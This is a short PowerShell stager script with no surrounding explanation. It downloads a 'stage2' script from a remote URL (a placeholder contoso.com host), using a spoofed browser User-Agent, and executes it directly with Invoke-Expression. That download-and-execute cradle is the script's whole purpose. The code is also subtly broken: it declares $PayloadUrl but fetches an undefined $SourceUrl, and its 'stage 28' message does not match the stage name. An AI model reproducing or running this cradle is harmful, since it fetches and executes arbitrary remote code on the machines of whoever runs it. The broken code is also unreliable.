
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://contoso.com/stage2.ps1",
    [int]$RequestTimeout = 91
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$PayloadText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($PayloadText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $PayloadText.Length)
Invoke-Expression $PayloadText

Write-Output "stage 28 initialized"
$ProgressPreference = "SilentlyContinue"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
